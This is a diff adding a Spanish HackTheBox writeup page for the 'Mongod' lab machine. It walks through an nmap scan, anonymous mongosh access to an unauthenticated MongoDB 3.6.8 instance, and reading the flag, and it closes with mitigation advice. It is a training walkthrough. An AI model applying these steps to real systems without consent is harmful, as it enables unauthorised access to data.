@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Mongod — HackTheBox Writeup | Brandeiks</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Mongod de HackTheBox (Linux, Muy Fácil): MongoDB 3.6.8 en el puerto 27017 sin control de acceso (usuario anónimo habilitado) → conexión con mongosh sin credenciales → enumeración de bases de datos → db.flag.find() en sensitive_information → flag.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/mongod.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Mongod — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Mongod de HackTheBox (Linux, Muy Fácil): MongoDB 3.6.8 sin control de acceso → conexión anónima con mongosh → show dbs → db.flag.find() en sensitive_information → flag.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/mongod.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/mongod.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Mongod — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Mongod de HackTheBox (Linux, Muy Fácil): MongoDB sin control de acceso → mongosh anónimo → db.flag.find() → flag.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/mongod.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Mongod — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Mongod de HackTheBox (Linux, Muy Fácil): MongoDB 3.6.8 en el puerto 27017 sin control de acceso permite una conexión anónima con mongosh, enumerar las bases de datos y leer la flag en la colección flag de sensitive_information.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/mongod.html", "image": "https://brandeiks.github.io/assets/og/mongod.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/mongod.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+    <a href="../../../comandos/index.html" class="nav-back">COMANDOS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>mongod</span>
+    </div>
+    <h1 class="writeup-title">MON<span>GOD</span></h1>
+    <p class="writeup-subtitle">// MongoDB sin control de acceso → conexión anónima con mongosh → db.flag.find()</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-db">MONGODB 3.6.8</span>
+      <span class="meta-badge badge-tech">NOSQL</span>
+      <span class="meta-badge badge-anon">ACCESO ANÓNIMO</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#mongosh">02 · Preparar mongosh</a></li>
+        <li><a href="#anon">03 · Conexión anónima</a></li>
+        <li><a href="#flag">04 · Enumeración y flag</a></li>
+        <li><a href="#cmdref">05 · Referencia Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Mongod</span></div>
+      <div class="info-row"><span class="info-label">SO</span><span class="info-val val-cyan">Linux</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">MongoDB 3.6.8</span></div>
+      <div class="info-row"><span class="info-label">PUERTO</span><span class="info-val val-cyan">27017</span></div>
+      <div class="info-row"><span class="info-label">TÉCNICA</span><span class="info-val val-cyan">Acceso anónimo</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>27017 MongoDB 3.6.8</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">mongosh <span>--host</span> sin credenciales</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Access control is not enabled</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">show dbs → <span>sensitive_information</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>db.flag.find()</span> → flag</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECON ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">CONTEXTO DE LA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>Mongod</strong> es una máquina <span class="hl-cyan">Linux</span> de dificultad
+          <span class="hl">Very Easy</span> centrada en <strong>MongoDB</strong> y en el uso de su shell
+          interactivo <span class="hl-cyan">mongosh</span>. El fallo es un clásico de bases de datos
+          NoSQL expuestas: el servicio arranca <strong>sin control de acceso</strong>, de modo que
+          cualquiera que alcance el puerto puede conectarse como usuario anónimo, enumerar todas las
+          bases de datos y leer su contenido <strong>sin credenciales</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Empezamos identificando los servicios expuestos. El escaneo revela <strong>2 puertos TCP
+          abiertos</strong>; el que importa es el <span class="hl-cyan">27017</span>, el puerto por
+          defecto de MongoDB.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nmap -sC -sV -p- -T4 10.129.228.30">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-sC</span> <span class="flag">-sV</span> <span class="flag">-p-</span> <span class="flag">-T4</span> <span class="arg">10.129.228.30</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PORT      STATE SERVICE  VERSION</div>
+        <div>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu</div>
+        <div>27017/tcp open  mongodb  <span class="o-green">MongoDB 3.6.8</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// EL PUERTO 27017</p>
+        <p>
+          <strong>27017</strong> es el puerto por defecto de <span class="hl-cyan">MongoDB</span>. Que
+          aparezca abierto de cara a la red ya es sospechoso: si además el servicio no exige
+          autenticación, la base de datos queda totalmente expuesta.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 MONGOSH ===================== -->
+    <div class="section" id="mongosh">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Preparar el cliente mongosh</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          MongoDB es una base de datos <strong>NoSQL</strong>: en vez de tablas, guarda la información en
+          <strong>documentos</strong> tipo JSON/BSON. Para hablar con ella de forma interactiva se usa el
+          cliente oficial <span class="hl-cyan">mongosh</span>. Como la máquina atacante no lo trae,
+          lo descargamos de los servidores oficiales de MongoDB.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">DESCARGAR EL BINARIO</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="wget https://downloads.mongodb.com/compass/mongosh-2.0.2-linux-x64.tgz">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">WGET</span>
+        <div><span class="prompt">$ </span><span class="cmd">wget <span class="arg">https://downloads.mongodb.com/compass/mongosh-2.0.2-linux-x64.tgz</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Connecting to downloads.mongodb.com ... connected.</div>
+        <div>HTTP request sent, awaiting response... <span class="o-green">200 OK</span></div>
+        <div>Length: 71429653 (68M) [application/octet-stream]</div>
+        <div>mongosh-2.0.2-linux 100%[==============&gt;]  68.12M  56.4MB/s    in 1.2s</div>
+        <div><span class="o-green">'mongosh-2.0.2-linux-x64.tgz' saved [71429653/71429653]</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">DESCOMPRIMIR</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="tar -xzf mongosh-2.0.2-linux-x64.tgz">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">TAR</span>
+        <div><span class="prompt">$ </span><span class="cmd">tar <span class="flag">-xzf</span> <span class="arg">mongosh-2.0.2-linux-x64.tgz</span></span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 03 ANON ===================== -->
+    <div class="section" id="anon">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Conexión anónima a MongoDB</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CONECTAR SIN CREDENCIALES</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el binario listo, apuntamos al servicio remoto con <span class="hl-yel">--host</span> y
+          <strong>sin</strong> usuario ni contraseña, al puerto por defecto 27017:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="./mongosh-2.0.2-linux-x64/bin/mongosh --host 10.129.228.30">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">MONGOSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">./mongosh-2.0.2-linux-x64/bin/mongosh <span class="flag">--host</span> <span class="arg">10.129.228.30</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Connecting to: mongodb://10.129.228.30:27017/?directConnection=true</div>
+        <div>Using MongoDB:          <span class="o-cyan">3.6.8</span></div>
+        <div>Using Mongosh:          2.0.2</div>
+        <div>------</div>
+        <div>&nbsp;&nbsp;&nbsp;The server generated these startup warnings when booting</div>
+        <div>&nbsp;&nbsp;&nbsp;** <span class="o-yellow">WARNING: Access control is not enabled for the database.</span></div>
+        <div>&nbsp;&nbsp;&nbsp;**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Read and write access to data and configuration is unrestricted.</div>
+        <div>------</div>
+        <div><span class="o-green">test&gt;</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// LA VULNERABILIDAD, CONFIRMADA POR EL PROPIO SERVIDOR</p>
+        <p>
+          El banner de arranque lo dice literalmente: <strong>«Access control is not enabled for the
+          database»</strong> — lectura y escritura <strong>sin restricciones</strong>. Ya estamos dentro
+          del shell (<code>test&gt;</code>) sin haber presentado ninguna credencial.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 FLAG ===================== -->
+    <div class="section" id="flag">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Enumeración y captura de la flag</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">LISTAR LAS BASES DE DATOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Dentro de <code>mongosh</code>, listamos todas las bases de datos con
+          <span class="hl-cyan">show dbs</span>. Una destaca por su nombre:
+          <span class="hl-cyan">sensitive_information</span>.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">test&gt;</span> show dbs</div>
+        <div>admin                 32.00 KiB</div>
+        <div>config                72.00 KiB</div>
+        <div>local                 72.00 KiB</div>
+        <div><span class="o-cyan">sensitive_information</span> 32.00 KiB</div>
+        <div>users                 32.00 KiB</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">COLECCIONES Y LECTURA DE LA FLAG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Cambiamos a esa base de datos con <span class="hl-cyan">use</span>, listamos sus colecciones
+          con <span class="hl-cyan">show collections</span> y volcamos la colección
+          <code>flag</code> con <span class="hl-cyan">db.flag.find()</span>:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">test&gt;</span> use sensitive_information</div>
+        <div>switched to db sensitive_information</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">sensitive_information&gt;</span> show collections</div>
+        <div><span class="o-cyan">flag</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">sensitive_information&gt;</span> db.flag.find()</div>
+        <div>[</div>
+        <div>&nbsp;&nbsp;{</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;_id: ObjectId("630e3dbcb82540ebbd1748c5"),</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;flag: '<span class="o-green">1b6e6fb359e7c40241b6d431427ba6ea</span>'</div>
+        <div>&nbsp;&nbsp;}</div>
+        <div>]</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// FLAG</p>
+        <p>
+          <strong>1b6e6fb359e7c40241b6d431427ba6ea</strong> — leída directamente de la colección
+          <code>flag</code> en <code>sensitive_information</code>, sin credenciales ni escalada: toda la
+          máquina se resuelve explotando la ausencia de autenticación en MongoDB.
+        </p>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// LECCIÓN Y MITIGACIÓN</p>
+        <p>
+          Dejar MongoDB <strong>sin control de acceso</strong> expone toda la base de datos a cualquiera
+          que alcance el 27017. La mitigación es habilitar autenticación
+          (<code>security.authorization: enabled</code> en <code>mongod.conf</code>, o arrancar con
+          <code>--auth</code>), crear usuarios con roles de mínimo privilegio en vez de depender del
+          acceso anónimo, no exponer el 27017 a Internet (firewall/VPC), cifrar el tráfico con TLS y
+          auditar los logs de conexión.
+        </p>
+      </div>
+
+      <hr class="divider">
+
+      <table class="vuln-table">
+        <thead>
+          <tr>
+            <th>VULNERABILIDAD</th>
+            <th>COMPONENTE</th>
+            <th>IMPACTO</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Access control deshabilitado</td>
+            <td>MongoDB 3.6.8 · puerto 27017</td>
+            <td>Conexión anónima: lectura/escritura sin credenciales</td>
+          </tr>
+          <tr>
+            <td>Datos sensibles sin proteger</td>
+            <td>DB sensitive_information · colección flag</td>
+            <td>Exfiltración directa del contenido con db.flag.find()</td>
+          </tr>
+          <tr>
+            <td>Servicio expuesto a la red</td>
+            <td>27017 accesible sin firewall</td>
+            <td>Superficie de ataque alcanzable por cualquier cliente</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ===================== 05 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -sC -sV -p- -T4 &lt;ip&gt;</div>
+          <div class="cmd-ref-desc">Escaneo de todos los puertos con scripts por defecto y detección de versión. Identifica MongoDB 3.6.8 en el 27017.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-sC</span> — scripts NSE por defecto</li>
+            <li><span>-sV</span> — detección de versión del servicio</li>
+            <li><span>-p-</span> — los 65 535 puertos TCP</li>
+            <li><span>-T4</span> — plantilla de tiempo agresiva (más rápido)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">wget · tar</div>
+          <div class="cmd-ref-syntax">wget &lt;url&gt;.tgz &amp;&amp; tar -xzf &lt;archivo&gt;.tgz</div>
+          <div class="cmd-ref-desc">Descarga el cliente mongosh de los servidores oficiales de MongoDB y descomprime el paquete .tgz para obtener el binario.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-x</span> — extraer</li>
+            <li><span>-z</span> — descomprimir gzip</li>
+            <li><span>-f</span> — indica el archivo a procesar</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">mongosh</div>
+          <div class="cmd-ref-syntax">mongosh --host &lt;ip&gt;</div>
+          <div class="cmd-ref-desc">Shell oficial de MongoDB. Al conectar sin usuario ni contraseña, el servidor sin control de acceso acepta la sesión anónima.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>--host</span> — IP o nombre del servidor</li>
+            <li><span>--port</span> — puerto (27017 por defecto)</li>
+            <li><span>-u / -p</span> — usuario / contraseña (aquí, innecesarios)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Comandos de mongosh</div>
+          <div class="cmd-ref-syntax">show dbs · use &lt;db&gt; · show collections · db.&lt;col&gt;.find()</div>
+          <div class="cmd-ref-desc">Enumeración de la base de datos: listar bases, cambiar de base, listar colecciones y volcar documentos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>show dbs</span> — lista las bases de datos</li>
+            <li><span>use &lt;db&gt;</span> — selecciona una base de datos</li>
+            <li><span>show collections</span> — lista las colecciones</li>
+            <li><span>db.&lt;col&gt;.find()</span> — muestra todos los documentos</li>
+          </ul>
+        </div>
+
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">SECUENCIA COMPLETA</span>
+      </div>
+      <div class="cmd-block" data-cmd="nmap -sC -sV -p- -T4 10.129.228.30 &amp;&amp; wget https://downloads.mongodb.com/compass/mongosh-2.0.2-linux-x64.tgz &amp;&amp; tar -xzf mongosh-2.0.2-linux-x64.tgz &amp;&amp; ./mongosh-2.0.2-linux-x64/bin/mongosh --host 10.129.228.30">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">RESUMEN</span>
+        <div><span class="comment"># 1. escanear</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-sC -sV -p- -T4</span> <span class="arg">10.129.228.30</span></span></div>
+        <div><span class="comment"># 2. descargar y descomprimir mongosh</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">wget <span class="arg">https://downloads.mongodb.com/compass/mongosh-2.0.2-linux-x64.tgz</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">tar <span class="flag">-xzf</span> <span class="arg">mongosh-2.0.2-linux-x64.tgz</span></span></div>
+        <div><span class="comment"># 3. conexión anónima</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">./mongosh-2.0.2-linux-x64/bin/mongosh <span class="flag">--host</span> <span class="arg">10.129.228.30</span></span></div>
+        <div><span class="comment"># 4. en el shell: show dbs -&gt; use sensitive_information -&gt; db.flag.find()</span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 06 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">MongoDB</div>
+          <div class="glos-def">
+            Base de datos <strong>NoSQL</strong> orientada a documentos, muy usada en aplicaciones web.
+            Guarda los datos en <strong>colecciones</strong> de documentos BSON (JSON binario) en lugar de
+            tablas y filas. Escucha por defecto en el puerto <strong>27017</strong>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">NoSQL</div>
+          <div class="glos-def">
+            Familia de bases de datos «no relacionales» (MongoDB, Redis, Cassandra…) que no usan SQL ni el
+            modelo de tablas. Priorizan la flexibilidad del esquema y la escalabilidad; en MongoDB cada
+            documento puede tener campos distintos dentro de una misma colección.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">mongosh</div>
+          <div class="glos-def">
+            El <strong>MongoDB Shell</strong> oficial: un cliente interactivo (basado en JavaScript) para
+            conectarse a un servidor MongoDB y ejecutar consultas y comandos administrativos como
+            <code>show dbs</code>, <code>use</code> o <code>db.&lt;col&gt;.find()</code>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Access control / --auth</div>
+          <div class="glos-def">
+            El <strong>control de acceso</strong> de MongoDB exige que los clientes se autentiquen. Si no
+            se habilita (opción <code>--auth</code> o <code>security.authorization: enabled</code>),
+            cualquiera que alcance el puerto se conecta como <strong>usuario anónimo</strong> con permisos
+            totales. Es la causa raíz de esta máquina.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Colección y documento</div>
+          <div class="glos-def">
+            En MongoDB, una <strong>colección</strong> es el equivalente a una tabla y un
+            <strong>documento</strong> a una fila, pero con forma de JSON/BSON. Cada documento lleva un
+            campo <code>_id</code> único (<code>ObjectId</code>). Aquí, la colección <code>flag</code>
+            contenía un único documento con el campo <code>flag</code>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Puerto 27017</div>
+          <div class="glos-def">
+            El puerto TCP por defecto del demonio <code>mongod</code>. Verlo abierto de cara a una red no
+            confiable es un indicador directo de MongoDB expuesto; combinado con la falta de
+            autenticación, equivale a dar acceso libre a todos los datos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Acceso anónimo / autenticación débil</div>
+          <div class="glos-def">
+            Situación en la que un servicio acepta conexiones <strong>sin credenciales</strong> (o con unas
+            por defecto). Es una de las configuraciones incorrectas más frecuentes y graves en servicios
+            de datos (MongoDB, Redis, Elasticsearch…) expuestos a Internet.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">BSON / ObjectId</div>
+          <div class="glos-def">
+            <strong>BSON</strong> es la representación binaria de JSON que usa MongoDB para almacenar
+            documentos. El <strong>ObjectId</strong> es el identificador único de 12 bytes que MongoDB
+            asigna a cada documento en el campo <code>_id</code> si no se especifica otro.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="initialization.html"><span class="dir">← ANTERIOR</span><span class="nombre">Initialization</span></a><a class="siguiente" href="../facil/base.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Base</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="redeemer.html"><span class="nombre">Redeemer</span><span class="meta">hackthebox · muy-facil · Redis</span></a><a class="rel-card" href="archetype.html"><span class="nombre">Archetype</span><span class="meta">hackthebox · muy-facil · MSSQL</span></a><a class="rel-card" href="../facil/base.html"><span class="nombre">Base</span><span class="meta">hackthebox · facil · Web</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Mongod · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
